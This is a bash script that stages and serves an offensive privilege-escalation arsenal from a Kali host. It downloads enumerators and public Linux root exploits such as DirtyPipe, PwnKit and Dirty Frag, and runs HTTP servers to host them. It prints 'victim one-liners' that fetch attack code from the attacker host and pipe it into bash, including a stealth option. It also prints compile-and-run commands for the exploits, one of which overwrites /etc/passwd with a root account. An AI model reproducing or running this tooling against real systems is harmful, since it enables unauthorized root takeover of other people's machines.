#!/bin/bash
# apex_serve.sh — Kali-side arsenal stager + HTTP delivery for APEX.
#
# Usage:   ./apex_serve.sh                 (interactive interface pick)
#          IFACE=eth0 ./apex_serve.sh      (non-interactive)
#          APEX_NO_DOWNLOAD=1 ./apex_serve.sh   (skip net fetches)
#
# Interface/port selection happens FIRST — you get the one-liners immediately.
# Downloads happen in the background while you're already attacking.
#   * Both servers chroot themselves to their serve dirs (python http.server
#     CWD).

set -u

APEX_HOME="${HOME:-/root}/.apex"
TOOLS_DIR="$APEX_HOME/tools"
CVE_DIR="$APEX_HOME/cve"
SERVE_DIR="$APEX_HOME/serve"
SERVE_CVE_DIR="$APEX_HOME/serve_cve"
LOG_DIR="$APEX_HOME/log"

mkdir -p "$TOOLS_DIR" "$CVE_DIR" "$SERVE_DIR" "$SERVE_CVE_DIR/cve" "$LOG_DIR"

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
APEX_SRC="$SCRIPT_DIR/apex.sh"

if [ ! -f "$APEX_SRC" ]; then
    printf '[!] apex.sh not found next to apex_serve.sh (%s)\n' "$APEX_SRC" >&2
    exit 1
fi

# ─────────────────────────────────────────────────────────────────────────────
# Step 0: ANSI helpers + interface + port selection  ← HAPPENS FIRST
# ─────────────────────────────────────────────────────────────────────────────
_c_reset=$'\033[0m'; _c_bold=$'\033[1m'
_c_green=$'\033[0;32m'; _c_yellow=$'\033[0;33m'; _c_red=$'\033[0;31m'
_c_cyan=$'\033[0;36m';  _c_bcyan=$'\033[1;36m';  _c_bgreen=$'\033[1;32m'
_c_byellow=$'\033[1;33m'
_say()  { printf '%s%s%s\n' "$_c_cyan"   "$*" "$_c_reset"; }
_ok()   { printf '%s[ok]%s %s\n'  "$_c_bgreen"  "$_c_reset" "$*"; }
_warn() { printf '%s[!] %s%s\n'   "$_c_byellow" "$*" "$_c_reset" >&2; }
_err()  { printf '%s[X] %s%s\n'   "$_c_red"     "$*" "$_c_reset" >&2; }
_hdr()  { printf '\n%s%s── %s ──%s\n' "$_c_bold" "$_c_bcyan" "$*" "$_c_reset"; }

_list_ifaces() {
    if command -v ip >/dev/null 2>&1; then
        ip -4 -o addr show 2>/dev/null | \
            awk '{ split($4,a,"/"); printf "  %s%-12s%s %s\n", "'"$_c_cyan"'", $2, "'"$_c_reset"'", a[1] }'
    else
        ifconfig 2>/dev/null | \
            awk '/^[a-zA-Z]/{i=$1} /inet /{print "  "i" "$2}' | sed 's/addr://'
    fi
}

_in_use() {
    local p="$1"
    ss -ltn 2>/dev/null | awk '{print $4}' | grep -qE ":$p\$" && return 0
    netstat -ltn 2>/dev/null | awk '{print $4}' | grep -qE ":$p\$" && return 0
    return 1
}

# Identify which process is holding a port. Returns a single human-readable
# line like "pid=1234 proc=python3 user=kali" or "" if we couldn't tell
# (often: held by another user and we're not root).
_who_uses_port() {
    local p="$1" line
    # ss with process info (needs root for other users' procs, but always
    # tells us OUR own procs and at least the program name when readable)
    if command -v ss >/dev/null 2>&1; then
        line=$(ss -ltnp 2>/dev/null | awk -v port=":$p" '$4 ~ port"$" {print; exit}')
        if [ -n "$line" ]; then
            # Extract users:(("name",pid=N,fd=M))
            local proc pid
            proc=$(printf '%s' "$line" | grep -oE 'users:\(\("[^"]+"' | head -1 | sed 's/.*"\([^"]*\)"/\1/')
            pid=$(printf '%s' "$line"  | grep -oE 'pid=[0-9]+' | head -1 | cut -d= -f2)
            if [ -n "$proc" ] || [ -n "$pid" ]; then
                printf 'pid=%s proc=%s' "${pid:-?}" "${proc:-?}"
                return 0
            fi
        fi
    fi
    # lsof fallback
    if command -v lsof >/dev/null 2>&1; then
        line=$(lsof -nP -iTCP:"$p" -sTCP:LISTEN 2>/dev/null | awk 'NR==2{print $1" "$2" "$3}')
        if [ -n "$line" ]; then
            printf 'proc=%s pid=%s user=%s' $line
            return 0
        fi
    fi
    # fuser fallback
    if command -v fuser >/dev/null 2>&1; then
        line=$(fuser -n tcp "$p" 2>/dev/null | tr -s ' ' | sed 's/^ *//')
        [ -n "$line" ] && { printf 'pid=%s' "$line"; return 0; }
    fi
    return 1
}

# Interactively pick a port. If $1=random, just call _pick_port (avoiding $2).
# If $1=ask, prompt the operator and validate (range, numeric, in-use, distinct
# from $2). Loops until a clean choice is made.
_choose_port() {
    local mode="$1" avoid="${2:-0}" label="${3:-port}" picked who
    if [ "$mode" = "random" ]; then
        _pick_port "$avoid"; return 0
    fi
    while :; do
        printf '%sEnter %s port (1-65535) [blank = random]: %s' \
            "$_c_byellow" "$label" "$_c_reset" >&2
        read -r picked </dev/tty
        if [ -z "$picked" ]; then
            _pick_port "$avoid"; return 0
        fi
        case "$picked" in
            *[!0-9]*) _err "not a number: $picked" ; continue ;;
        esac
        if [ "$picked" -lt 1 ] || [ "$picked" -gt 65535 ]; then
            _err "out of range (1-65535): $picked" ; continue
        fi
        if [ "$picked" = "$avoid" ]; then
            _err "must differ from the other port ($avoid)" ; continue
        fi
        if [ "$picked" -lt 1024 ] && [ "$(id -u)" != "0" ]; then
            _warn "port $picked is privileged — needs root. Re-run with sudo or choose >=1024."
            continue
        fi
        if _in_use "$picked"; then
            who=$(_who_uses_port "$picked")
            if [ -n "$who" ]; then
                _err "port $picked already in use by: $who"
            else
                _err "port $picked already in use (process owned by another user — re-run with sudo to see who, or pick another)"
            fi
            continue
        fi
        printf '%s' "$picked"
        return 0
    done
}

_pick_port() {
    local attempt=0 raw p
    while [ "$attempt" -lt 50 ]; do
        attempt=$((attempt + 1))
        raw=$(od -An -N2 -tu2 /dev/urandom 2>/dev/null | tr -d ' \n')
        [ -z "$raw" ] && continue
        case "$raw" in *[!0-9]*) continue ;; esac
        p=$(( raw % 16348 + 49152 ))
        if ! _in_use "$p" && [ "$p" != "${1:-0}" ]; then
            printf '%s' "$p"; return 0
        fi
    done
    printf '%s' "$(( 49152 + (RANDOM % 16000) ))"
}

# ── Interface + port: ask IMMEDIATELY so one-liners print before downloads ──
clear 2>/dev/null
printf '%s╔══════════════════════════════════════════════════════════════════════════╗%s\n' "$_c_bcyan" "$_c_reset"
printf '%s║                    APEX SERVE — Interface Selection                      ║%s\n' "$_c_bcyan" "$_c_reset"
printf '%s╚══════════════════════════════════════════════════════════════════════════╝%s\n\n' "$_c_bcyan" "$_c_reset"

printf '%sAvailable interfaces:%s\n' "$_c_bold" "$_c_reset"
_list_ifaces
printf '\n'

SELECTED_IFACE="${IFACE:-}"
if [ -z "$SELECTED_IFACE" ]; then
    printf '%sEnter interface [default: tun0]: %s' "$_c_byellow" "$_c_reset"
    read -r SELECTED_IFACE
    SELECTED_IFACE="${SELECTED_IFACE:-tun0}"
fi

SERVE_IP=""
if command -v ip >/dev/null 2>&1; then
    SERVE_IP=$(ip -4 -o addr show dev "$SELECTED_IFACE" 2>/dev/null | \
               awk '{split($4,a,"/"); print a[1]; exit}')
else
    SERVE_IP=$(ifconfig "$SELECTED_IFACE" 2>/dev/null | \
               awk '/inet /{print $2}' | sed 's/addr://' | head -1)
fi

if [ -z "$SERVE_IP" ]; then
    _err "No IPv4 on interface $SELECTED_IFACE"
    _list_ifaces >&2
    exit 1
fi

# ── Port mode: random (default) or operator-specified ───────────────────────
PORT_MODE="random"
if [ -n "${ARSENAL_PORT:-}" ] || [ -n "${CVE_PORT:-}" ]; then
    # Env-var override — skip prompt entirely
    PORT_MODE="env"
else
    printf '%sUse random ports? [Y/n]: %s' "$_c_byellow" "$_c_reset"
    read -r _port_ans
    case "${_port_ans:-Y}" in
        n|N|no|NO) PORT_MODE="ask" ;;
        *)        PORT_MODE="random" ;;
    esac
fi

case "$PORT_MODE" in
    random)
        ARSENAL_PORT=$(_choose_port random)
        CVE_PORT=$(_choose_port random "$ARSENAL_PORT")
        ;;
    ask)
        ARSENAL_PORT=$(_choose_port ask 0 "arsenal")
        CVE_PORT=$(_choose_port ask "$ARSENAL_PORT" "CVE PoCs")
        ;;
    env)
        ARSENAL_PORT="${ARSENAL_PORT:-$(_pick_port)}"
        CVE_PORT="${CVE_PORT:-$(_pick_port "$ARSENAL_PORT")}"
        if [ "$ARSENAL_PORT" = "$CVE_PORT" ]; then
            _err "ARSENAL_PORT and CVE_PORT must differ"; exit 1
        fi
        for _p in "$ARSENAL_PORT" "$CVE_PORT"; do
            if _in_use "$_p"; then
                _err "port $_p (from env) already in use: $(_who_uses_port "$_p")"
                exit 1
            fi
        done
        ;;
esac

printf '\n%s[+] Interface : %s (%s)%s\n' "$_c_bgreen" "$SELECTED_IFACE" "$SERVE_IP" "$_c_reset"
printf '%s[+] Arsenal   : port %s%s\n' "$_c_bgreen" "$ARSENAL_PORT" "$_c_reset"
printf '%s[+] CVE PoCs  : port %s%s\n\n' "$_c_bgreen" "$CVE_PORT" "$_c_reset"

# Print the main one-liner NOW (before any downloads — operator can attack immediately)
printf '%s╔══ VICTIM ONE-LINERS (copy now, downloads still running) ═══════════════╗%s\n' "$_c_bcyan" "$_c_reset"
printf '%s║%s\n' "$_c_bcyan" "$_c_reset"
printf '%s║  %s# PRIMARY (recommended)%s\n' "$_c_bcyan" "$_c_yellow" "$_c_reset"
printf '%s║  %sbash <(curl -fsSL http://%s:%s/apex.sh)%s\n' \
    "$_c_bcyan" "$_c_bgreen" "$SERVE_IP" "$ARSENAL_PORT" "$_c_reset"
printf '%s║%s\n' "$_c_bcyan" "$_c_reset"
printf '%s║  %s# FALLBACKS%s\n' "$_c_bcyan" "$_c_yellow" "$_c_reset"
printf '%s║  %scurl -fsSL http://%s:%s/apex.sh | bash%s\n' \
    "$_c_bcyan" "$_c_cyan" "$SERVE_IP" "$ARSENAL_PORT" "$_c_reset"
printf '%s║  %swget -qO- http://%s:%s/apex.sh | bash%s\n' \
    "$_c_bcyan" "$_c_cyan" "$SERVE_IP" "$ARSENAL_PORT" "$_c_reset"
printf '%s║  %spython3 -c "import urllib.request as u; exec(u.urlopen('"'"'http://%s:%s/apex.sh'"'"').read())"%s\n' \
    "$_c_bcyan" "$_c_cyan" "$SERVE_IP" "$ARSENAL_PORT" "$_c_reset"
printf '%s║%s\n' "$_c_bcyan" "$_c_reset"
printf '%s║  %s# STEALTH MODE%s\n' "$_c_bcyan" "$_c_yellow" "$_c_reset"
printf '%s║  %sbash <(curl -fsSL http://%s:%s/apex.sh) --stealth%s\n' \
    "$_c_bcyan" "$_c_cyan" "$SERVE_IP" "$ARSENAL_PORT" "$_c_reset"
printf '%s╚═══════════════════════════════════════════════════════════════════════════╝%s\n\n' \
    "$_c_bcyan" "$_c_reset"

printf '%sTool downloads starting in background... (one-liners will update below)\n%s' \
    "$_c_yellow" "$_c_reset"
printf '\n'

# ─────────────────────────────────────────────────────────────────────────────
# Step 1: Locate / install enumerators
# ─────────────────────────────────────────────────────────────────────────────
# Each entry: <dest_filename>|<github_url>|<search_path_csv>
# search_path_csv = comma-separated list of well-known local install paths.
# First existing match is COPIED into TOOLS_DIR.
TOOL_LIST=$(cat <<'EOF'
pspy64|https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64|/usr/local/bin/pspy64,/usr/bin/pspy64,/opt/pspy/pspy64,/home/kali/privesc-toolkit/linux/pspy64
pspy64s|https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64s|/usr/local/bin/pspy64s,/opt/pspy/pspy64s,/home/kali/privesc-toolkit/linux/pspy64s
pspy32|https://github.com/DominicBreuker/pspy/releases/latest/download/pspy32|/usr/local/bin/pspy32,/opt/pspy/pspy32,/home/kali/privesc-toolkit/linux/pspy32
pspy32s|https://github.com/DominicBreuker/pspy/releases/latest/download/pspy32s|/usr/local/bin/pspy32s,/opt/pspy/pspy32s,/home/kali/privesc-toolkit/linux/pspy32s
linpeas.sh|https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh|/usr/share/peass/linpeas.sh,/usr/local/bin/linpeas.sh,/opt/peass-ng/linpeas.sh,/home/kali/privesc-toolkit/linux/linpeas.sh
linenum.sh|https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh|/usr/share/linenum/LinEnum.sh,/usr/local/bin/LinEnum.sh,/opt/LinEnum/LinEnum.sh,/home/kali/privesc-toolkit/linux/LinEnum.sh,/home/kali/privesc-toolkit/linux/linenum.sh
lse.sh|https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh|/usr/local/bin/lse.sh,/opt/lse/lse.sh,/home/kali/privesc-toolkit/linux/lse.sh
les.sh|https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh|/usr/local/bin/les.sh,/opt/les/les.sh,/home/kali/privesc-toolkit/linux/les.sh,/home/kali/privesc-toolkit/linux/linux-exploit-suggester.sh
les2.pl|https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl|/usr/local/bin/les2.pl,/opt/les2/linux-exploit-suggester-2.pl,/home/kali/privesc-toolkit/linux/les2.pl
EOF
)

_download_one() {
    local dest="$1" url="$2"
    if [ -n "${APEX_NO_DOWNLOAD:-}" ]; then
        _warn "APEX_NO_DOWNLOAD=1 — skipping fetch of $dest"
        return 1
    fi
    if command -v curl >/dev/null 2>&1; then
        curl -fL --connect-timeout 15 --max-time 120 -o "$dest" "$url" 2>/dev/null && return 0
    fi
    if command -v wget >/dev/null 2>&1; then
        wget -q --timeout=120 -O "$dest" "$url" 2>/dev/null && return 0
    fi
    if command -v python3 >/dev/null 2>&1; then
        python3 - <<PYEOF 2>/dev/null
import urllib.request, sys
try:
    urllib.request.urlretrieve("$url","$dest"); sys.exit(0)
except Exception:
    sys.exit(1)
PYEOF
        [ $? -eq 0 ] && return 0
    fi
    return 1
}

_size_of() {
    local f="$1"
    if [ -f "$f" ]; then
        stat -c '%s' "$f" 2>/dev/null || stat -f '%z' "$f" 2>/dev/null || wc -c < "$f" 2>/dev/null
    else
        printf '0'
    fi
}

_hdr "Stage 1 — Arsenal (enumerators)"

printf '%s\n' "$TOOL_LIST" | while IFS='|' read -r dest url paths; do
    [ -z "$dest" ] && continue
    destpath="$TOOLS_DIR/$dest"

    # If already cached and big enough, skip.
    size=$(_size_of "$destpath")
    if [ "${size:-0}" -gt 10240 ]; then
        _ok "$dest cached ($(printf '%s' "$size") bytes)"
        continue
    fi

    # Try each local search path.
    found=""
    OLDIFS="$IFS"; IFS=','
    set -- $paths
    IFS="$OLDIFS"
    for p in "$@"; do
        if [ -f "$p" ]; then
            found="$p"; break
        fi
    done

    if [ -n "$found" ]; then
        cp "$found" "$destpath" 2>/dev/null && chmod 755 "$destpath" && \
            _ok "$dest copied from $found" && continue
    fi

    # Download.
    printf '%s[..] fetching %-14s %s\n' "$_c_yellow" "$dest" "$url" >&2
    if _download_one "$destpath" "$url"; then
        chmod 755 "$destpath" 2>/dev/null
        nsz=$(_size_of "$destpath")
        if [ "${nsz:-0}" -gt 10240 ]; then
            _ok "$dest downloaded ($nsz bytes)"
        else
            _warn "$dest downloaded but too small ($nsz bytes) — likely a 404 page; discarding"
            rm -f "$destpath"
        fi
    else
        _err "$dest download FAILED"
        rm -f "$destpath"
    fi
done

# Mirror everything we have into the serve dir.
cp "$APEX_SRC" "$SERVE_DIR/apex.sh"
chmod 755 "$SERVE_DIR/apex.sh"
mkdir -p "$SERVE_DIR/tools"
rm -f "$SERVE_DIR/tools"/* 2>/dev/null
for tf in "$TOOLS_DIR"/*; do
    [ -f "$tf" ] || continue
    cp "$tf" "$SERVE_DIR/tools/$(basename "$tf")"
    chmod 755 "$SERVE_DIR/tools/$(basename "$tf")"
done
# Also expose flat names at the serve root for legacy URLs used by apex.sh.
for tf in "$SERVE_DIR/tools"/*; do
    [ -f "$tf" ] || continue
    ln -sf "tools/$(basename "$tf")" "$SERVE_DIR/$(basename "$tf")" 2>/dev/null || \
        cp "$tf" "$SERVE_DIR/$(basename "$tf")"
done

# ─────────────────────────────────────────────────────────────────────────────
# Step 2: CVE PoC tree
# ─────────────────────────────────────────────────────────────────────────────
# Linux LPE PoCs — only deterministic / high-success-rate exploits.
# Each entry (tab-separated):  filename | url | note | success | run_cmd | local_paths
#   filename    — file name as served to victim
#   url         — verified GitHub raw URL (HEAD-checked at build time of this list)
#   note        — affected kernel / distro / cause
#   success     — measured reliability per upstream (50..99). Used for INDEX.json
#                 sort and for the SAVED block in apex.sh.
#   run_cmd     — single shell command victim should run, with __FILE__ placeholder
#                 (apex.sh substitutes the staged path on the victim)
#   local_paths — comma-separated locations to copy from BEFORE attempting GitHub
#                 download. Lets operators pre-stage their preferred PoC.
#
# 2026 additions (Copy Fail + Dirty Frag) — all three repos are PUBLIC and the
# canonical sources. Verified 200 OK as of 2026-05-15.
CVE_LIST=$(cat <<'EOF'
CVE-2026-31431_copy_fail.py	https://raw.githubusercontent.com/theori-io/copy-fail-CVE-2026-31431/main/copy_fail_exp.py	Copy Fail (Theori original Python) — AF_ALG+splice page-cache mutation of /usr/bin/su; deterministic, no race; 9-year LPE	95	python3 __FILE__	/home/kali/privesc-toolkit/cve/copy_fail_exp.py,/home/kali/privesc-toolkit/cve/CVE-2026-31431_copy_fail.py,/opt/cve/copy_fail_exp.py,/usr/share/exploitdb/exploits/linux/local/copy_fail_exp.py
CVE-2026-31431_copy_fail_passwd.c	https://raw.githubusercontent.com/tgies/copy-fail-c/main/exploit-passwd.c	Copy Fail C port — /etc/passwd UID-flip variant (single-file build, no payload deps)	90	gcc -O2 -o /tmp/cf_pw __FILE__ && /tmp/cf_pw	/home/kali/privesc-toolkit/cve/exploit-passwd.c,/home/kali/privesc-toolkit/cve/CVE-2026-31431_copy_fail_passwd.c,/opt/cve/exploit-passwd.c
CVE-2026-43284_dirtyfrag.c	https://raw.githubusercontent.com/V4bel/dirtyfrag/master/exp.c	Dirty Frag (V4bel) — chains xfrm-ESP + RxRPC page-cache writes; deterministic; covers Ubuntu/RHEL/Fedora/OpenSUSE kernels 2017→2026-05	99	gcc -O0 -Wall -o /tmp/df __FILE__ -lutil && /tmp/df && su	/home/kali/privesc-toolkit/cve/dirtyfrag.c,/home/kali/privesc-toolkit/cve/CVE-2026-43284_dirtyfrag.c,/home/kali/privesc-toolkit/cve/exp.c,/opt/cve/dirtyfrag.c
CVE-2026-43500_dirtyfrag.c	https://raw.githubusercontent.com/V4bel/dirtyfrag/master/exp.c	Dirty Frag (RxRPC half) — same single-binary chain; works where unprivileged user namespaces are blocked by AppArmor (Ubuntu hardened)	99	gcc -O0 -Wall -o /tmp/df __FILE__ -lutil && /tmp/df && su	/home/kali/privesc-toolkit/cve/dirtyfrag.c,/home/kali/privesc-toolkit/cve/exp.c
CVE-2023-32233_nft.c	https://raw.githubusercontent.com/Liuk3r/CVE-2023-32233/main/exploit.c	netfilter nf_tables UAF — kernels 5.1-6.3.1	75	gcc -o /tmp/nf __FILE__ && /tmp/nf	/home/kali/privesc-toolkit/cve/CVE-2023-32233.c,/opt/cve/nft.c
CVE-2022-0847_dirtypipe.c	https://raw.githubusercontent.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/main/exploit-1.c	DirtyPipe — kernels 5.8-5.16.10; overwrites read-only files via pipe page splice	95	gcc -o /tmp/dp __FILE__ && /tmp/dp /etc/passwd 1 'root:$1$abc$./xxxxxxxxxxxxxxxxxxxx0:0:root:/root:/bin/bash'	/home/kali/privesc-toolkit/cve/dirtypipe.c,/home/kali/privesc-toolkit/cve/CVE-2022-0847.c,/opt/cve/dirtypipe.c
CVE-2021-4034_pwnkit.c	https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/cve-2021-4034.c	PwnKit / pkexec — every distro 2009-2022; environment-based LPE	90	gcc -o /tmp/pk __FILE__ && /tmp/pk	/home/kali/privesc-toolkit/cve/pwnkit.c,/home/kali/privesc-toolkit/cve/CVE-2021-4034.c,/opt/cve/pwnkit.c
CVE-2023-4911_looney.c	https://raw.githubusercontent.com/leesh3288/CVE-2023-4911/main/exp.c	Looney Tunables — glibc ld.so GLIBC_TUNABLES; every distro Aug 2023+	75	gcc -o /tmp/lt __FILE__ && /tmp/lt	/home/kali/privesc-toolkit/cve/looneytunables.c,/home/kali/privesc-toolkit/cve/CVE-2023-4911.c,/opt/cve/looney.c
EOF
)

_hdr "Stage 2 — 2026-current CVE PoCs"

CVE_OUT="$SERVE_CVE_DIR/cve"
mkdir -p "$CVE_OUT"
INDEX="$SERVE_CVE_DIR/INDEX.json"
printf '{\n  "served": "%s",\n  "entries": [\n' "$(date -u +%Y-%m-%dT%H:%M:%SZ)" > "$INDEX"

cve_count=0
first=1
# Use FD 3 for the heredoc so the inner curl/cp can still touch stdin.
exec 3<<EOF
$CVE_LIST
EOF
while IFS='	' read -r fname url note success run_cmd local_paths <&3; do
    [ -z "$fname" ] && continue
    dest="$CVE_DIR/$fname"

    # Source-of-truth priority: local cache → operator-pre-staged path → GitHub.
    if [ ! -f "$dest" ] || [ "$(_size_of "$dest")" -lt 200 ]; then
        found=""
        if [ -n "$local_paths" ]; then
            OLDIFS="$IFS"; IFS=','
            set -- $local_paths
            IFS="$OLDIFS"
            for p in "$@"; do
                if [ -f "$p" ] && [ "$(_size_of "$p")" -gt 200 ]; then
                    found="$p"; break
                fi
            done
        fi
        if [ -n "$found" ]; then
            cp "$found" "$dest" 2>/dev/null && \
                _ok "$fname copied from local $found"
        else
            printf '%s[..] fetching %s%s\n' "$_c_yellow" "$fname" "$_c_reset"
            _download_one "$dest" "$url"
        fi
    fi

    sz=$(_size_of "$dest")
    if [ "${sz:-0}" -gt 200 ]; then
        cp "$dest" "$CVE_OUT/$fname"
        chmod 644 "$CVE_OUT/$fname"
        cve_count=$((cve_count + 1))
        _ok "$fname (${sz} B, success=${success}%) — $note"
        # JSON-escape the metadata strings (note + run_cmd may contain quotes/backslashes/$).
        esc_note=$(printf '%s' "$note" | sed 's/\\/\\\\/g; s/"/\\"/g')
        esc_run=$(printf '%s'  "$run_cmd" | sed 's/\\/\\\\/g; s/"/\\"/g')
        [ "$first" = "0" ] && printf ',\n' >> "$INDEX"
        first=0
        printf '    {"file":"%s","note":"%s","success":%s,"run":"%s","bytes":%s}' \
            "$fname" "$esc_note" "$success" "$esc_run" "$sz" >> "$INDEX"
    else
        _warn "$fname unavailable (size=$sz) — skipped"
        rm -f "$dest" "$CVE_OUT/$fname"
    fi
done
exec 3<&-

printf '\n  ]\n}\n' >> "$INDEX"
cp "$INDEX" "$CVE_OUT/INDEX.json"

# (Interface + port selection already done above — Step 0)

# Re-stage apex.sh with a baked-in APEX_ORIGIN export. Process-substitution
# (bash <(curl URL)) often reaps curl before apex_detect_origin runs — the
# sibling walk then misses the URL and arsenal/CVE staging is skipped. Baking
# the env var into the served copy makes detection unconditional.
cp "$APEX_SRC" "$SERVE_DIR/apex.sh"
{
    head -n 1 "$APEX_SRC"
    printf 'export APEX_ORIGIN="http://%s:%s"\n' "$SERVE_IP" "$ARSENAL_PORT"
    printf 'export APEX_CVE_BASE="http://%s:%s/cve"\n' "$SERVE_IP" "$CVE_PORT"
    tail -n +2 "$APEX_SRC"
} > "$SERVE_DIR/apex.sh.tmp" && mv "$SERVE_DIR/apex.sh.tmp" "$SERVE_DIR/apex.sh"
chmod 755 "$SERVE_DIR/apex.sh"

# ─────────────────────────────────────────────────────────────────────────────
# Step 5: Persist config, write banner, launch servers
# ─────────────────────────────────────────────────────────────────────────────
cat > "$APEX_HOME/serve_config" <<EOF
SERVE_IP=$SERVE_IP
SERVE_IFACE=$SELECTED_IFACE
ARSENAL_PORT=$ARSENAL_PORT
CVE_PORT=$CVE_PORT
SERVE_DIR=$SERVE_DIR
SERVE_CVE_DIR=$SERVE_CVE_DIR
EOF

# Also drop a manifest.txt into the arsenal root so victim-side apex.sh can
# discover the CVE port and the tool list without hard-coding either.
{
    printf 'arsenal_base=http://%s:%s\n' "$SERVE_IP" "$ARSENAL_PORT"
    printf 'cve_base=http://%s:%s/cve\n' "$SERVE_IP" "$CVE_PORT"
    printf 'tools:'
    for f in "$SERVE_DIR/tools"/*; do
        [ -f "$f" ] || continue
        printf ' %s' "$(basename "$f")"
    done
    printf '\n'
} > "$SERVE_DIR/manifest.txt"

# List served tools
SERVED_TOOLS=""
for f in "$SERVE_DIR/tools"/*; do
    [ -f "$f" ] || continue
    SERVED_TOOLS="$SERVED_TOOLS $(basename "$f")"
done

# List served CVEs
SERVED_CVES=""
for f in "$CVE_OUT"/*; do
    [ -f "$f" ] || continue
    [ "$(basename "$f")" = "INDEX.json" ] && continue
    SERVED_CVES="$SERVED_CVES $(basename "$f")"
done

printf '\n%s╔══ APEX SERVE — ALL READY ════════════════════════════════════════════════╗%s\n' "$_c_bcyan" "$_c_reset"
printf '%s║  Interface : %-58s║%s\n' "$_c_bcyan" "$SELECTED_IFACE ($SERVE_IP)" "$_c_reset"
printf '%s║  Arsenal   : %-58s║%s\n' "$_c_bcyan" "http://${SERVE_IP}:${ARSENAL_PORT}/" "$_c_reset"
printf '%s║  CVE PoCs  : %-58s║%s\n' "$_c_bcyan" "http://${SERVE_IP}:${CVE_PORT}/cve/" "$_c_reset"
printf '%s╠══ APEX ONE-LINERS ═══════════════════════════════════════════════════════╣%s\n' "$_c_bcyan" "$_c_reset"
printf '%s║%s\n' "$_c_bcyan" "$_c_reset"
printf '%s║  %s[APEX]%s bash <(curl -fsSL http://%s:%s/apex.sh)%s\n' \
    "$_c_bcyan" "$_c_bgreen" "$_c_reset" "$SERVE_IP" "$ARSENAL_PORT" "$_c_reset"
printf '%s║  %s[APEX]%s bash <(curl -fsSL http://%s:%s/apex.sh) --stealth%s\n' \
    "$_c_bcyan" "$_c_yellow" "$_c_reset" "$SERVE_IP" "$ARSENAL_PORT" "$_c_reset"
printf '%s║  %s[APEX]%s bash <(curl -fsSL http://%s:%s/apex.sh) --full%s\n' \
    "$_c_bcyan" "$_c_cyan"   "$_c_reset" "$SERVE_IP" "$ARSENAL_PORT" "$_c_reset"
printf '%s║%s\n' "$_c_bcyan" "$_c_reset"

printf '%s╠══ INDIVIDUAL TOOL ONE-LINERS ════════════════════════════════════════════╣%s\n' "$_c_bcyan" "$_c_reset"
printf '%s║%s\n' "$_c_bcyan" "$_c_reset"
for t in $SERVED_TOOLS; do
    sz=$(_size_of "$SERVE_DIR/tools/$t")
    local_path="/tmp/$t"
    # Generate appropriate run command per tool type
    case "$t" in
        pspy*) run_hint="chmod +x $local_path && $local_path -pf" ;;
        linpeas*) run_hint="bash $local_path" ;;
        lse*) run_hint="bash $local_path -l2" ;;
        les*) run_hint="bash $local_path" ;;
        *) run_hint="bash $local_path" ;;
    esac
    printf '%s║  %s[%-12s]%s curl -fsSL http://%s:%s/%s -o %s && %s%s\n' \
        "$_c_bcyan" "$_c_cyan" "$t" "$_c_reset" \
        "$SERVE_IP" "$ARSENAL_PORT" "$t" "$local_path" "$run_hint" ""
done
printf '%s║%s\n' "$_c_bcyan" "$_c_reset"

printf '%s╠══ CVE POC ONE-LINERS (sorted by success%%) ══════════════════════════════╣%s\n' "$_c_bcyan" "$_c_reset"
printf '%s║%s\n' "$_c_bcyan" "$_c_reset"
# Parse INDEX.json to get sorted CVE entries
if [ -f "$SERVE_CVE_DIR/cve/INDEX.json" ] && command -v python3 >/dev/null 2>&1; then
    python3 - "$SERVE_CVE_DIR/cve/INDEX.json" "$SERVE_IP" "$CVE_PORT" <<'PYEOF'
import json, sys
data = json.load(open(sys.argv[1]))
ip, port = sys.argv[2], sys.argv[3]
entries = sorted(data.get("entries",[]), key=lambda x: -x.get("success",0))
for e in entries:
    f = e.get("file","")
    success = e.get("success","?")
    run = e.get("run","").replace("__FILE__", f"/tmp/{f}")
    local_path = f"/tmp/{f}"
    print(f"  [{success:>2}%] [{f}]")
    print(f"       dl:  curl -fsSL http://{ip}:{port}/cve/{f} -o {local_path}")
    print(f"       run: {run}")
    print("")
PYEOF
else
    for c in $SERVED_CVES; do
        printf '%s║  %scurl -fsSL http://%s:%s/cve/%s -o /tmp/%s%s\n' \
            "$_c_bcyan" "$_c_cyan" "$SERVE_IP" "$CVE_PORT" "$c" "$c" "$_c_reset"
    done
fi | while IFS= read -r _line; do
    printf '%s║  %s%s%s\n' "$_c_bcyan" "$_c_cyan" "$_line" "$_c_reset"
done
printf '%s║%s\n' "$_c_bcyan" "$_c_reset"
printf '%s╚═══════════════════════════════════════════════════════════════════════════╝%s\n\n' \
    "$_c_bcyan" "$_c_reset"

# ─────────────────────────────────────────────────────────────────────────────
# Step 6: Launch both servers in the background
# ─────────────────────────────────────────────────────────────────────────────
if ! command -v python3 >/dev/null 2>&1; then
    _err "python3 not found — cannot start HTTP servers"
    exit 1
fi

ARSENAL_LOG="$LOG_DIR/arsenal_${ARSENAL_PORT}.log"
CVE_LOG="$LOG_DIR/cve_${CVE_PORT}.log"

( cd "$SERVE_DIR"     && python3 -m http.server "$ARSENAL_PORT" --bind "$SERVE_IP" ) > "$ARSENAL_LOG" 2>&1 &
ARSENAL_PID=$!
( cd "$SERVE_CVE_DIR" && python3 -m http.server "$CVE_PORT"     --bind "$SERVE_IP" ) > "$CVE_LOG" 2>&1 &
CVE_PID=$!

_cleanup() {
    printf '\n%s[*]%s shutting down servers...\n' "$_c_yellow" "$_c_reset"
    [ -n "${ARSENAL_PID:-}" ] && kill "$ARSENAL_PID" 2>/dev/null
    [ -n "${CVE_PID:-}" ]     && kill "$CVE_PID"     2>/dev/null
    wait 2>/dev/null
    exit 0
}
trap _cleanup INT TERM

# Brief health-check.
sleep 1
if ! kill -0 "$ARSENAL_PID" 2>/dev/null; then
    _err "arsenal server failed to start. log:"; tail -20 "$ARSENAL_LOG" >&2; exit 1
fi
if ! kill -0 "$CVE_PID" 2>/dev/null; then
    _err "cve server failed to start. log:"; tail -20 "$CVE_LOG" >&2; exit 1
fi

